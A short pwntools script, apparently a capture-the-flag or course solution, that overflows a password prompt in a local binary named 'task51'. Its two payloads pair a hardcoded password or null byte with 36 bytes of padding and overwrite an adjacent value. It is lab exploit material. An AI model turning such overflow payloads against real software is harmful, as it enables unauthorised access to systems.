from pwn import *


io = process("./task51")

io.recvuntil("Enter password:")

# TASK 1
# offset from payload to length -> 36
# payload = b'Oqu3raiN' + b'A' * 36 + p32(12345)
# io.sendline(payload)

# TASK 2
payload = b'\0' + b'A' * 7 + b'A' * 36 + p32(0)
io.sendline(payload)

io.interactive()
